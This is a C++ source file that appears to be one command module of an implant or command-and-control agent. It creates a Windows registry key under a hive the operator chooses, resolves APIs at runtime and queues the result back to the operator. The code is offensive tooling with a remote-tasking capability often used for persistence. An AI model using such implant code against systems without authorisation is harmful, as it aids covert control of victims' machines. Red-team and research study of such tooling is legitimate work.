#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>

#ifdef INCLUDE_CMD_REG_CREATE_KEY

using namespace stardust;
using namespace starburst;

static auto declfn parse_hive_ck( instance& inst, char* hive_str ) -> HKEY {
    if ( str_cmp( hive_str, symbol<char*>( const_cast<char*>( "HKLM" ) ) ) == 0 ||
         str_cmp( hive_str, symbol<char*>( const_cast<char*>( "HKEY_LOCAL_MACHINE" ) ) ) == 0 )
        return HKEY_LOCAL_MACHINE;
    if ( str_cmp( hive_str, symbol<char*>( const_cast<char*>( "HKCU" ) ) ) == 0 ||
         str_cmp( hive_str, symbol<char*>( const_cast<char*>( "HKEY_CURRENT_USER" ) ) ) == 0 )
        return HKEY_CURRENT_USER;
    if ( str_cmp( hive_str, symbol<char*>( const_cast<char*>( "HKCR" ) ) ) == 0 )
        return HKEY_CLASSES_ROOT;
    if ( str_cmp( hive_str, symbol<char*>( const_cast<char*>( "HKU" ) ) ) == 0 )
        return HKEY_USERS;
    return nullptr;
}

auto declfn starburst::cmd_reg_create_key(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    uint32_t hive_len = 0;
    auto hive_str = parser_string( params, &hive_len );
    uint32_t key_len = 0;
    auto key_str = parser_string( params, &key_len );

    if ( !hive_str || hive_len == 0 || !key_str || key_len == 0 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "need hive and key" ) ) );
        return;
    }

    char hive_buf[64] = { 0 };
    memory::copy( hive_buf, hive_str, hive_len < 63 ? hive_len : 63 );
    char key_buf[512] = { 0 };
    memory::copy( key_buf, key_str, key_len < 511 ? key_len : 511 );

    HKEY hive = parse_hive_ck( inst, hive_buf );
    if ( !hive ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "invalid hive" ) ) );
        return;
    }

    HKEY h_key = nullptr;
    DWORD disposition = 0;
    LSTATUS status = inst.advapi32.RegCreateKeyExA(
        hive, key_buf, 0, nullptr, REG_OPTION_NON_VOLATILE,
        KEY_ALL_ACCESS, nullptr, &h_key, &disposition );

    if ( status != ERROR_SUCCESS ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "RegCreateKeyExA failed" ) ) );
        return;
    }

    inst.advapi32.RegCloseKey( h_key );

    // build output: "Created key: HIVE\key"
    char output[640] = { 0 };
    uint32_t off = 0;
    str_copy( output + off, symbol<char*>( const_cast<char*>( "Created key: " ) ) );
    off = str_len( output );
    memory::copy( output + off, hive_buf, str_len( hive_buf ) );
    off += str_len( hive_buf );
    output[off++] = '\\';
    memory::copy( output + off, key_buf, str_len( key_buf ) );
    off += str_len( key_buf );
    output[off] = '\0';

    queue_response( inst, task_uuid, RESPONSE_SUCCESS, output );
}

#endif
